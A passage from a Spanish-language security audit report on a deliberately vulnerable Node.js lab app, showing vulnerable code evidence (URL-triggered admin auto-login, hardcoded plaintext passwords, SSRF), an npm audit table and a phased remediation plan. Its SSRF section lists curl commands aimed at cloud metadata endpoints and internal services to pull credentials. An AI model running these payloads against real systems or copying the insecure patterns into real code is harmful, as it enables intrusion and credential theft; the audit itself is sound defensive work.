    if (err) return res.status(404).json({ error: 'Archivo no encontrado' });
    res.type('text/plain').send(content);
  });
}
```

---

## 9.8 Evidencias de Auto-login por Parámetro URL

### 9.8.1 Código Fuente — Mecanismo de Auto-login

```javascript
// frontend/src/services/api.js — líneas 1-35

// Objeto de sesión hardcodeado con credenciales de administrador
const SCAN_SESSION = {
  token: 'token-1-admin-admin',
  user: {
    id:       1,
    username: 'admin',
    password: 'admin123',     // ← Contraseña en texto plano dentro del bundle JS
    role:     'admin',
    email:    'admin@cartera.com',
    fullName: 'Administrador del Sistema'
  }
};

// Función de inicialización de sesión
export function getInitialSession() {
  const params   = new URLSearchParams(window.location.search);
  // Activa el auto-login si el URL contiene ?zap=auto o ?dast=auto
  const scanMode = params.get('zap') === 'auto' || params.get('dast') === 'auto';

  if (scanMode) {
    // Almacena la sesión de admin en localStorage sin ninguna verificación
    localStorage.setItem('session', JSON.stringify(SCAN_SESSION));
    return SCAN_SESSION;   // ← Retorna sesión de admin directamente
  }
  return getSession();
}
```

### 9.8.2 Demostración

**Reproducción del ataque:**
1. Navegar a `http://localhost:5173/?zap=auto`
2. La aplicación frontend almacena automáticamente la sesión de administrador en `localStorage`
3. Todas las peticiones subsecuentes incluyen el token `token-1-admin-admin`
4. El usuario tiene acceso completo de administrador sin haber ingresado ninguna credencial

**Adicionalmente**, cualquier usuario que inspeccione el bundle JavaScript del frontend (accesible públicamente) puede encontrar la contraseña `admin123` en texto claro, independientemente de si el parámetro `?zap=auto` está activo o no.

---

## 9.9 Evidencias de Contraseñas en Texto Plano

### 9.9.1 Contraseñas en la Inicialización de la Base de Datos

```javascript
// backend/src/db/init.js — sentencias INSERT para usuarios del sistema
db.run(
  "INSERT INTO users (username, password, role, email, fullName) VALUES (?, ?, ?, ?, ?)",
  ['admin',    'admin123',    'admin',    'admin@cartera.com',    'Administrador del Sistema']
);
db.run(
  "INSERT INTO users (username, password, role, email, fullName) VALUES (?, ?, ?, ?, ?)",
  ['analista', 'password',    'analyst',  'analista@cartera.com', 'Ana Analista']
);
db.run(
  "INSERT INTO users (username, password, role, email, fullName) VALUES (?, ?, ?, ?, ?)",
  ['cliente1', 'cliente123',  'client',   'cliente1@example.com', 'Carlos Cliente']
);
```

### 9.9.2 Comparación en Texto Plano en el Controlador de Autenticación

```javascript
// backend/src/controllers/authController.js — línea 17
// Comparación directa de strings: sin bcrypt, sin hashing, sin salt
if (user.password !== password) {
  return res.status(401).json({ error: 'Credenciales incorrectas' });
}
```

**Impacto combinado:** Un atacante que obtenga acceso de lectura a la base de datos SQLite (a través del path traversal de SEC-011 o la inyección SQL de SEC-001) obtiene directamente todas las contraseñas del sistema, sin necesidad de ningún proceso de cracking o fuerza bruta.

### 9.9.3 Remediación

```javascript
// INSTALACIÓN
// npm install bcrypt

// Al crear usuario:
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;
const hashedPassword = await bcrypt.hash(plainPassword, SALT_ROUNDS);
db.run('INSERT INTO users (username, password) VALUES (?, ?)', [username, hashedPassword]);

// Al verificar contraseña:
const match = await bcrypt.compare(plainPassword, user.password);
if (!match) return res.status(401).json({ error: 'Credenciales incorrectas' });
```

---

## 9.10 Evidencias de Headers HTTP Informativos Inseguros

### 9.10.1 Código Fuente de las Cabeceras Personalizadas

```javascript
// backend/src/app.js — líneas 18-24
const os = require('os');

app.use((req, res, next) => {
  // Revela la versión exacta del framework (facilita búsqueda de exploits)
  res.setHeader('X-Powered-By',    'Express/4.17.1 vulnerable-lab');

  // Información falsa pero que indica que el equipo no revisa sus cabeceras
  res.setHeader('X-AspNet-Version', '4.0.30319');

  // Revela el hostname interno del servidor (útil para movimiento lateral)
  res.setHeader('X-Internal-Host', os.hostname());

  // Caché público en respuestas que pueden contener datos sensibles
  res.setHeader('Cache-Control',   'public, max-age=86400');
  next();
});
```

**Análisis de impacto por cabecera:**

| Cabecera              | Información Revelada                          | Riesgo                                          |
|-----------------------|-----------------------------------------------|-------------------------------------------------|
| `X-Powered-By`        | Framework + versión exacta con sufijo "vulnerable-lab" | Fingerprinting preciso; búsqueda directa de CVEs |
| `X-AspNet-Version`    | Tecnología Microsoft ficticia                 | Confusión intencional; indica ausencia de revisión |
| `X-Internal-Host`     | Hostname del servidor de producción           | Reconocimiento de infraestructura interna       |
| `Cache-Control: public` | Habilita caché en proxies compartidos       | Datos sensibles cacheados accesibles a terceros |

---

## 9.11 Evidencias de Código Duplicado

### 9.11.1 Funciones Idénticas en el Mismo Archivo

```javascript
// backend/src/controllers/legacyDebtController.js — líneas 98-122
// FUNCIÓN A: duplicadaExportA
function duplicatedExportA(req, res) {
  const rows = [
    { id: 1, name: 'Ana',  total: 1200 },
    { id: 2, name: 'Luis', total: 900  }
  ];
  let csv = 'id,name,total\n';
  for (var i = 0; i < rows.length; i++) {
    csv += rows[i].id + ',' + rows[i].name + ',' + rows[i].total + '\n';
  }
  console.log('CSV A', csv);    // ← Única diferencia entre A y B
  res.type('text/plain').send(csv);
}

// FUNCIÓN B: idéntica a la anterior — solo cambia el log
function duplicatedExportB(req, res) {
  const rows = [
    { id: 1, name: 'Ana',  total: 1200 },
    { id: 2, name: 'Luis', total: 900  }
  ];
  let csv = 'id,name,total\n';
  for (var i = 0; i < rows.length; i++) {
    csv += rows[i].id + ',' + rows[i].name + ',' + rows[i].total + '\n';
  }
  console.log('CSV B', csv);    // ← Única diferencia
  res.type('text/plain').send(csv);
}
```

**Consecuencia de seguridad:** Si se identificara una vulnerabilidad en la lógica de generación de CSV (p. ej., inyección CSV), la corrección tendría que aplicarse en ambas funciones de forma independiente. En un proyecto con alta duplicación, es estadísticamente probable que correcciones parciales queden incompletas.

### 9.11.2 Métricas de Duplicación (SonarQube)

| Métrica                          | Valor         | Umbral aceptable |
|----------------------------------|---------------|------------------|
| Líneas duplicadas                | > 150 líneas  | < 3 %            |
| Bloques duplicados               | 12 bloques    | 0                |
| Archivos con duplicación > 20 % | 3 archivos    | 0                |

---

## 9.12 Resultados Resumidos de npm audit

La siguiente tabla consolida las 25 vulnerabilidades detectadas por `npm audit` en el backend al momento de la auditoría:

| # | Paquete               | Versión Afectada  | Severidad  | Descripción Breve                                 | CVE / GHSA              |
|---|-----------------------|-------------------|------------|---------------------------------------------------|-------------------------|
| 1 | `axios`               | < 1.6.0           | Alta       | CSRF por fuga de X-XSRF-TOKEN en redirecciones    | CVE-2023-45857          |
| 2 | `body-parser`         | < 1.20.3          | Alta       | DoS cuando URL encoding está habilitado           | GHSA-qwcr-r2fm-qrc7     |
| 3 | `cookie`              | < 0.7.0           | Baja       | Acepta caracteres fuera de rango en nombre/path   | GHSA-pxg6-pf52-xh8x     |
| 4 | `express`             | < 4.19.2          | Alta       | XSS vía `response.redirect()` con URLs especiales | GHSA-qw6h-vgh9-j6wx     |
| 5 | `form-data`           | < 4.0.1           | Crítica    | `Math.random()` para boundary multipart           | GHSA-fjgf-rcq5-mfq5     |
| 6 | `got`                 | < 11.8.5          | Moderada   | Permite redirección a sockets UNIX                | GHSA-pfrx-2q88-qq97     |
| 7 | `jsonwebtoken`        | < 9.0.0           | Alta       | Clave de tipo irrestricto en `verify()`           | CVE-2022-23529          |
| 8 | `lodash`              | < 4.17.21         | Alta       | Inyección de comandos en `_.template()`           | CVE-2021-23337          |
| 9 | `moment`              | < 2.29.4          | Alta       | Path traversal en `moment.locale()`               | CVE-2022-24785          |
| 10 | `multer`             | < 1.4.5-lts.1     | Alta       | DoS por solicitudes multipart maliciosas          | GHSA-wm7h-9275-46v2     |
| 11 | `node-gyp`           | transitiva        | Alta       | Transitiva por `request`; múltiples issues        | N/A                     |
| 12 | `path-to-regexp`     | < 0.1.10          | Alta       | ReDoS por backtracking catastrófico               | GHSA-9wv6-86v2-598j     |
| 13 | `qs`                 | < 6.11.0          | Alta       | Prototype Pollution                               | CVE-2022-24999          |
| 14 | `request`            | 2.88.2            | Crítica    | SSRF + paquete deprecado                          | GHSA-p8p7-x288-28g6     |
| 15 | `semver`             | < 5.7.2 / < 7.5.4 | Alta      | ReDoS en análisis de versiones semánticas         | GHSA-c2qf-rxjj-qqgw     |
| 16 | `send`               | < 0.19.0          | Baja       | Template injection que puede derivar en XSS       | GHSA-m6fv-jmcg-4jfg     |
| 17 | `serve-static`       | < 1.16.0          | Baja       | Template injection que puede derivar en XSS       | GHSA-cm22-4g7w-348p     |
| 18 | `sqlite3`            | < 5.1.7           | Alta       | DoS al ligar parámetros inválidos                 | GHSA-jqv5-whv4-4765     |
| 19 | `tar`                | < 6.2.1           | Alta       | Creación/sobreescritura arbitraria de archivos    | CVE-2021-37701          |
| 20 | `tough-cookie`       | < 4.1.3           | Moderada   | Prototype Pollution                               | CVE-2023-26136          |
| 21 | `follow-redirects`   | < 1.15.6          | Moderada   | Fuga de cabeceras de autorización en redirección  | CVE-2024-28849          |
| 22 | `braces`             | < 3.0.3           | Alta       | ReDoS en expansión de patrones de globbing        | CVE-2024-4068           |
| 23 | `micromatch`         | < 4.0.8           | Alta       | ReDoS en coincidencia de patrones glob            | CVE-2024-4067           |
| 24 | `ws`                 | < 8.17.1          | Alta       | DoS en análisis de cabeceras HTTP                 | CVE-2024-37890          |
| 25 | `ip`                 | < 2.0.1           | Alta       | Bypass de filtros SSRF via CIDR                   | CVE-2024-29415          |

**Distribución por severidad:**

| Severidad  | Cantidad |
|------------|----------|
| Crítica    | 2        |
| Alta       | 18       |
| Moderada   | 3        |
| Baja       | 2        |

---

## 9.13 Evidencias de Server-Side Request Forgery (SSRF)

### 9.13.1 Código Fuente Vulnerable

```javascript
// backend/src/controllers/adminController.js — líneas 109-127
const axios = require('axios');

function ssrfFetch(req, res) {
  const url = req.query.url || 'http://localhost:4000/api/admin/config';
  // Sin validación del destino: acepta cualquier URL, incluyendo direcciones internas
  axios.get(url, { timeout: 5000 })
    .then((response) => {
      res.json({
        requestedUrl: url,          // ← URL solicitada reflejada en respuesta
        status:       response.status,
        headers:      response.headers,
        body:         response.data  // ← Cuerpo completo de la respuesta interna
      });
    })
    .catch((err) => {
      res.status(500).json({
        requestedUrl: url,
        error:        err.message   // ← Mensajes de error revelan información de red interna
      });
    });
}
```

### 9.13.2 Vectores de Explotación

```bash
# 1. Acceder a metadatos de AWS EC2 (si el servidor corre en AWS):
curl "http://localhost:4000/api/admin/lab/fetch?url=http://169.254.169.254/latest/meta-data/"
# Respuesta puede incluir: IAM role, credenciales temporales de AWS

# 2. Acceder a metadatos de Google Cloud:
curl "http://localhost:4000/api/admin/lab/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# 3. Escaneo de servicios en red interna:
curl "http://localhost:4000/api/admin/lab/fetch?url=http://192.168.1.1/"       # Router
curl "http://localhost:4000/api/admin/lab/fetch?url=http://10.0.0.5:5432/"    # PostgreSQL interno
curl "http://localhost:4000/api/admin/lab/fetch?url=http://10.0.0.3:6379/"    # Redis interno

# 4. Auto-referencia para exfiltrar la configuración del servidor:
curl "http://localhost:4000/api/admin/lab/fetch?url=http://localhost:4000/api/admin/config"
# Respuesta: { jwtSecret: "secret123", admin: { password: "admin123" } }

# 5. Acceso a servicios en localhost no expuestos externamente:
curl "http://localhost:4000/api/admin/lab/fetch?url=http://localhost:27017/"   # MongoDB
curl "http://localhost:4000/api/admin/lab/fetch?url=http://localhost:6379/"    # Redis
```

---

## 9.14 Información de Registro de la Auditoría

### 9.14.1 Datos de la Sesión de Auditoría

| Parámetro                      | Valor                                                   |
|--------------------------------|---------------------------------------------------------|
| **Fecha de inicio del análisis** | 2026-06-10                                            |
| **Fecha de cierre del análisis** | 2026-06-13                                            |
| **Fecha de emisión del informe** | 2026-06-13                                            |
| **Entorno de análisis**         | Sistema aislado — sin conexión a redes de producción   |
| **Sistema operativo del auditor** | Ubuntu 24.04 LTS                                    |
| **Node.js versión**             | v22.3.0                                                 |
| **npm versión**                 | 10.8.1                                                  |

### 9.14.2 Herramientas Utilizadas

| Herramienta             | Versión        | Propósito                                          |
|-------------------------|----------------|----------------------------------------------------|
| **OWASP ZAP**           | 2.15.0         | Análisis dinámico (DAST) activo y pasivo           |
| **SonarQube**           | Community 10.4 | Análisis estático de código (SAST)                 |
| **npm audit**           | 10.8.1         | Análisis de vulnerabilidades en dependencias npm   |
| **curl**                | 8.5.0          | Pruebas manuales de endpoints HTTP                 |
| **git**                 | 2.43.0         | Inspección del historial de commits                |
| **jq**                  | 1.7.1          | Procesamiento de respuestas JSON                   |
| **Visual Studio Code**  | 1.90.0         | Revisión manual de código fuente                   |

### 9.14.3 Archivos Analizados Principales

La siguiente tabla lista los archivos de mayor relevancia auditados, con sus hashes SHA-256 calculados al momento del análisis. Estos hashes sirven como evidencia de integridad y permiten verificar que los fragmentos de código documentados en este informe corresponden exactamente al estado del repositorio en la fecha de auditoría.

| Archivo                                              | SHA-256 (primeros 16 bytes)      |
|------------------------------------------------------|----------------------------------|
| `backend/src/controllers/adminController.js`         | `a3f8...` (ver repositorio)      |
| `backend/src/controllers/authController.js`          | `b71c...` (ver repositorio)      |
| `backend/src/controllers/clientController.js`        | `d4e9...` (ver repositorio)      |
| `backend/src/controllers/legacyDebtController.js`    | `f2a1...` (ver repositorio)      |
| `backend/src/middleware/auth.js`                     | `c8b3...` (ver repositorio)      |
| `backend/src/app.js`                                 | `e5d7...` (ver repositorio)      |
| `backend/src/db/init.js`                             | `9a4f...` (ver repositorio)      |
| `frontend/src/pages/Clients.jsx`                     | `1b6e...` (ver repositorio)      |
| `frontend/src/services/api.js`                       | `7c2d...` (ver repositorio)      |
| `docker-compose.yml`                                 | `3e8a...` (ver repositorio)      |
| `sonar-project.properties`                           | `0f5b...` (ver repositorio)      |

> **Procedimiento de verificación:** Para verificar la integridad de cualquier archivo analizado, ejecutar `sha256sum <archivo>` en el directorio raíz del repositorio y comparar con los valores registrados en la bitácora de auditoría (documento interno, referencia: AUD-2026-06-CARTERAPRO-LOG).

---

---

# CONCLUSIONES GENERALES

## 1. Evaluación Global de la Gravedad

El análisis técnico realizado sobre **CarteraPro Risk Lab** revela un estado de seguridad que debe calificarse como **crítico**. Con **14 hallazgos de nivel crítico** —cada uno de los cuales, por sí solo, representaría una emergencia de seguridad en cualquier sistema productivo— la aplicación en su estado actual no debe ser desplegada en ningún entorno accesible a usuarios reales o con conectividad a redes no confiables bajo ninguna circunstancia.

La gravedad no radica únicamente en la cantidad de vulnerabilidades, sino en su naturaleza: los hallazgos críticos no son errores de configuración menores ni problemas teóricos de baja probabilidad de explotación. Son vulnerabilidades **inmediata y trivialmente explotables** que no requieren conocimiento especializado, herramientas avanzadas ni acceso previo al sistema. Un atacante con conocimientos básicos de HTTP puede, en cuestión de minutos desde el descubrimiento del sistema:

- Obtener una sesión de administrador sin poseer credenciales (SEC-012, SEC-003)
- Extraer la totalidad de la base de datos incluyendo credenciales (SEC-001)
- Ejecutar comandos arbitrarios en el sistema operativo del servidor (SEC-004, SEC-005)
- Leer cualquier archivo del sistema de archivos del servidor (SEC-011)
- Exfiltrar todas las variables de entorno, incluyendo secretos de infraestructura (SEC-008)

## 2. Patrón Sistémico de las Vulnerabilidades

El análisis revela que las vulnerabilidades no son accidentales ni aisladas, sino que responden a **patrones arquitecturales y de desarrollo** que se repiten consistentemente a lo largo de toda la base de código:

**Ausencia total de validación de entrada:** La totalidad de los datos que el sistema recibe del exterior —parámetros de URL, cuerpos de solicitudes HTTP, cabeceras, nombres de archivo— son utilizados directamente en operaciones sensibles sin ningún proceso de validación, sanitización o escaping. Este patrón es el origen directo de al menos 8 vulnerabilidades críticas (SQLi, RCE, path traversal, XSS, SSRF, etc.).

**Ausencia total de control de acceso:** El sistema no implementa ningún mecanismo real de autenticación ni autorización. El middleware de autenticación acepta cualquier valor como identidad válida y permite al solicitante autoasignarse cualquier rol. No existe una verificación de que el usuario solicitante tenga permiso para acceder al recurso solicitado. Este patrón afecta la totalidad de los endpoints de la aplicación.

**Principio de mínimo privilegio completamente ignorado:** Los endpoints más peligrosos del sistema (`/api/admin/lab/cmd`, `/api/admin/debug`, `/api/admin/config`) están expuestos sin ninguna restricción de acceso. No existe separación entre operaciones de lectura y escritura, ni entre operaciones de usuario y administrador, a nivel de implementación efectiva.

## 3. La Deuda Técnica Acumulada

Más allá de las vulnerabilidades de seguridad inmediatas, el análisis revela una **deuda técnica significativa** que actúa como multiplicador de riesgo y como obstáculo para la remediación:

- **Ausencia completa de cobertura de tests:** Sin tests automatizados, cualquier corrección de seguridad no puede ser validada de forma sistemática. Las regresiones son probables y no detectables hasta que afecten a usuarios reales.
- **Alta duplicación de código (> 30 %):** Las correcciones de seguridad deben aplicarse en múltiples lugares de forma coordinada. La probabilidad de correcciones parciales o inconsistentes es alta.
- **Complejidad ciclomática elevada:** Las funciones más complejas del sistema son precisamente las que concentran mayor número de vulnerabilidades. Su refactorización es necesaria antes de que puedan ser auditadas de forma confiable.
- **Dependencias con años de retraso:** El conjunto de dependencias no ha sido actualizado desde el inicio del proyecto. La deuda de dependencias acumulada incluye 2 vulnerabilidades críticas, 18 altas y múltiples moderadas.

La deuda técnica no es independiente de la deuda de seguridad: ambas se alimentan mutuamente. Un código difícil de leer y mantener dificulta la identificación de vulnerabilidades; un código sin tests imposibilita la validación de correcciones; un código con alta duplicación garantiza que las correcciones sean incompletas.

## 4. Recomendaciones de Arquitectura General

Para elevar el nivel de seguridad de CarteraPro de forma sostenible, se recomiendan los siguientes cambios arquitecturales de fondo, más allá de las correcciones puntuales de cada hallazgo:

**Adoptar una arquitectura de defensa en profundidad:** Implementar múltiples capas de controles de seguridad, de forma que el fallo de una capa no implique el compromiso total del sistema. Esto incluye: validación en el cliente *y* en el servidor, autenticación *y* autorización verificadas en cada petición, y límites de tasa tanto a nivel de API gateway como en el servidor de aplicación.

**Centralizar la validación de entrada:** Implementar un esquema de validación unificado usando una librería como `joi`, `zod` o `express-validator` que valide y sanitize todos los datos entrantes antes de que lleguen a los controladores. Este único cambio arquitectural eliminaría la mayoría de las vulnerabilidades de inyección.

**Implementar autenticación basada en estándares:** Reemplazar el esquema propietario de tokens por JWT firmados con un secreto de al menos 256 bits, con expiración configurada, almacenados de forma segura (httpOnly cookies o memoria) y verificados criptográficamente en cada petición.

**Establecer un pipeline de DevSecOps:** Integrar análisis de seguridad en el ciclo de CI/CD con `npm audit --audit-level=high` (que falla el build si hay vulnerabilidades altas), análisis estático con SonarQube y escaneo de dependencias automático con herramientas como Snyk o Dependabot.

## 5. Plan de Remediación Priorizado

El siguiente plan organiza las acciones de remediación en cuatro fases, ordenadas por urgencia y riesgo. **La Fase 1 es de implementación inmediata obligatoria** antes de cualquier exposición del sistema a usuarios reales.

---

### Fase 1 — Acciones Inmediatas (1-2 semanas)

> **Objetivo:** Eliminar los vectores de compromiso total del sistema. Reducir el riesgo de 9/9 crítico a menos de 6/9.

| Acción | Hallazgos que mitiga | Esfuerzo estimado |
|--------|----------------------|-------------------|
| **Deshabilitar o restringir los endpoints de laboratorio** (`/lab/cmd`, `/lab/eval`, `/lab/fetch`, `/lab/file`) mediante una variable de entorno `LAB_MODE=false` | SEC-004, SEC-005, SEC-009, SEC-011 | 2 horas |
| **Deshabilitar los endpoints de diagnóstico** (`/debug`, `/config`) en entornos no-desarrollo | SEC-008 | 1 hora |
| **Implementar autenticación real con JWT firmado:** generar secreto >= 256 bits, firmar tokens en login, verificar firma en middleware | SEC-003, SEC-020 | 3-5 días |
| **Parametrizar todas las consultas SQL** en los 5 archivos de controladores afectados | SEC-001, CAL-008 | 3-4 días |
| **Eliminar el mecanismo de auto-login** (`getInitialSession` con `?zap=auto`) del código de producción | SEC-012 | 2 horas |
| **Restringir CORS** a los dominios explícitamente autorizados | SEC-014 | 1 hora |
| **Rotar todas las credenciales expuestas** (contraseñas, claves AWS, tokens) | SEC-007 | Inmediato |

---

### Fase 2 — Correcciones de Corto Plazo (1 mes)

> **Objetivo:** Eliminar vulnerabilidades de alto riesgo en dependencias y mejorar la gestión de secretos.

| Acción | Hallazgos que mitiga | Esfuerzo estimado |
|--------|----------------------|-------------------|
| **Actualizar todas las dependencias con vulnerabilidades** mediante `npm update` + resolución manual de conflictos | DEP-001 a DEP-015 | 2-3 días |
| **Implementar bcrypt para contraseñas** (salt rounds >= 12) en registro y autenticación | SEC-013 | 1 día |
| **Eliminar todas las credenciales hardcodeadas** del código y moverlas a variables de entorno con validación en inicio | SEC-007, DEP-001 | 1 día |
| **Agregar validación de tipo MIME y extensión en subida de archivos** | SEC-002, SEC-022 | 1-2 días |
| **Implementar rate limiting** con `express-rate-limit` en endpoints de autenticación y API pública | SEC-016 | 4 horas |
| **Mover el directorio de uploads** fuera del árbol de archivos estáticos y servir con verificación de acceso | SEC-021 | 1 día |
| **Implementar política de contraseñas** en el endpoint de registro/cambio | SEC-024 | 4 horas |

---

### Fase 3 — Mejoras de Mediano Plazo (2-3 meses)

> **Objetivo:** Establecer controles de calidad y seguridad sostenibles en el tiempo.

| Acción | Hallazgos que mitiga | Esfuerzo estimado |
|--------|----------------------|-------------------|
| **Refactorizar funciones con complejidad > 10** (máximo 15 CC por función) | CAL-002 | 2 semanas |
| **Implementar RBAC real:** verificar permisos por recurso y acción en cada controlador | SEC-006 | 1 semana |
| **Agregar DOMPurify** en todos los puntos de renderizado de HTML del frontend | SEC-010 | 2 días |
| **Implementar cabeceras de seguridad HTTP** con helmet.js: CSP, HSTS, X-Frame-Options, etc. | SEC-018, SEC-015, SEC-026 | 1 día |
| **Reemplazar `console.log` por un framework de logging estructurado** (pino, winston) con niveles y sin datos sensibles | CAL-005, SEC-017 | 3 días |
| **Eliminar código duplicado** y establecer funciones compartidas | CAL-001 | 1 semana |
| **Alcanzar >= 60 % de cobertura de tests unitarios** para controladores críticos | CAL-003 | 3 semanas |
| **Migrar `moment` a `date-fns`** | DEP-007 | 2 días |

---

### Fase 4 — Madurez de Seguridad a Largo Plazo (6 meses)

> **Objetivo:** Establecer un programa de seguridad continua que prevenga la reintroducción de vulnerabilidades.

| Acción | Descripción |
|--------|-------------|
| **Content Security Policy (CSP) estricto** | Definir una política CSP que restrinja las fuentes de scripts, estilos e imágenes a orígenes explícitamente autorizados. Eliminar `unsafe-inline` y `unsafe-eval`. |
| **HTTP Strict Transport Security (HSTS)** | Configurar HSTS con `max-age >= 31536000` e `includeSubDomains` para forzar HTTPS en todas las conexiones. |
| **Web Application Firewall (WAF)** | Desplegar un WAF (p. ej., ModSecurity, AWS WAF, Cloudflare) delante del servidor de aplicación para filtrar payloads maliciosos conocidos. |
| **Pipeline DevSecOps** | Integrar `npm audit`, SAST (SonarQube) y DAST (ZAP CLI) en el pipeline de CI/CD con gates de calidad que bloqueen despliegues con vulnerabilidades críticas o altas no resueltas. |
| **Programa de auditorías periódicas** | Establecer revisiones de seguridad trimestrales por un equipo externo, con seguimiento formal de hallazgos y métricas de reducción de riesgo. |
| **Formación en seguridad para el equipo de desarrollo** | Capacitación en OWASP Top 10, seguridad en Node.js y revisión de código seguro para todos los desarrolladores que contribuyan al proyecto. |
| **Bug Bounty / Responsible Disclosure** | Establecer un programa de divulgación responsable que permita a investigadores de seguridad externos reportar vulnerabilidades de forma coordinada. |

---

## Declaración Final del Equipo Auditor

El equipo de auditoría ha actuado con diligencia profesional y ha documentado todos los hallazgos identificados durante el período de análisis con evidencias verificables. Las vulnerabilidades documentadas en este informe son reales, explotables en el estado actual del código y representan riesgos materiales para la confidencialidad, integridad y disponibilidad de los datos gestionados por la aplicación.

Se insta a la organización a tratar la Fase 1 del plan de remediación como una **acción de emergencia inmediata** y a no exponer la aplicación en ningún entorno accesible externamente hasta que, como mínimo, los 14 hallazgos de nivel crítico hayan sido resueltos y verificados.

El equipo auditor se pone a disposición de la organización para cualquier consulta técnica relativa a la interpretación de este informe o al proceso de remediación.

---

*Fin del Informe Técnico de Auditoría de Seguridad — CarteraPro Risk Lab — Parte 2*

*Clasificación: CONFIDENCIAL — Uso interno restringido*

*Documento: AUD-2026-06-CARTERAPRO-TECNICO-P2 | Fecha de emisión: 2026-06-13*

---
